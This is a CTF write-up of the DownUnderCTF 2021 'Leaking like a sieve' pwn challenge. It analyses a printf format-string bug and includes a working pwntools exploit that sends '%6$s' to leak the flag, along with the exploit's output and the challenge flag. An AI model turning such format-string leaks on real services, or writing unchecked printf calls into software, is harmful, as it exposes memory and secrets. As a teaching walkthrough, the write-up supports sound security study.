# DownUnderCTF 2021

## Leaking like a sieve

> 100
> 
> This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?
> 
> Author: xXl33t_h@x0rXx
>
> `nc pwn-2021.duc.tf 31918`
>
> [`hellothere`](hellothere)

Tags: _pwn_ _x86-64_ _format-string_

## Summary

Basic _leak the flag from a pointer in the stack_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Partial RELRO = GOT overwrite; No canary = Easy BOF.

None of this matters for this challenge.


### Decompile with Ghidra   

```c
void main(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [32];
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  buffer_init();
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("The flag file isn\'t loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(local_38,0x20,__stream);
  do {
    puts("What is your name?");
    fgets(local_58,0x20,stdin);
    printf("\nHello there, ");
    printf(local_58);
    putchar(10);
  } while( true );
}
```

`printf(local_58);` is your vuln--no format string.

`*__stream` is a pointer to the flag and is also on the stack, and probably at parameter `6`.  If this does not make sense, then Google for _format string exploits_.  In short, x86_64 Linux ABI has parameters 0-5 in registers and the rest on the stack (in general).

Since we know the pointer is on the stack, you can simply just send `%x$s` where `x` is any number >= `6` until you get the flag, i.e. start at `6` (or `1` if you like) and increment.

`%x%s` is a legit `printf` format-string, e.g. you can try this in C if you like:

```
#include <stdio.h>

void main()
{
    printf("%1$s %1$s\n","blah");
}
```

This code will output `blah` twice (the format-string is parameter zero if you were wondering why counting started at one).

Now change the `1` to a `2` and see what happens?  Good chance it'll crash.  If you just get garbage consider yourself lucky.  So if scripting to find the flag, check for crashes or timeouts in your code.  Or just use GDB to find the correct parameter:

```
0x00007fffffffe300│+0x0000: 0x00007fffffffe330  →  "flag{flag}\n"	 ← $rsp
0x00007fffffffe308│+0x0008: 0x00005555555592a0  →  0x00000000fbad2488
0x00007fffffffe310│+0x0010: 0x0000000a68616c62 ("blah\n"?)	 ← $rdi
0x00007fffffffe318│+0x0018: 0x00007fffffffe347  →  0x005555555550b000
0x00007fffffffe320│+0x0020: 0x00007fffffffe346  →  0x5555555550b00000
0x00007fffffffe328│+0x0028: 0x00005555555552e5  →  <__libc_csu_init+69> add rbx, 0x1
0x00007fffffffe330│+0x0030: "flag{flag}\n"
```

Looks like the flag was also on stack, curtesy of `fgets(local_38,0x20,__stream);`, so one could have also just used the tired old `%x$p` loop to leak the flag (more work).


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./hellothere')

if args.REMOTE:
    p = remote('pwn-2021.duc.tf', 31918)
else:
    p = process(binary.path)

p.sendlineafter(b'name?\n',b'%6$s')
p.recvuntil(b'there, ')
flag = p.recvline().strip()
log.info('flag: ' + flag.decode())
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/hellothere/hellothere'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-2021.duc.tf on port 31918: Done
[*] flag: DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```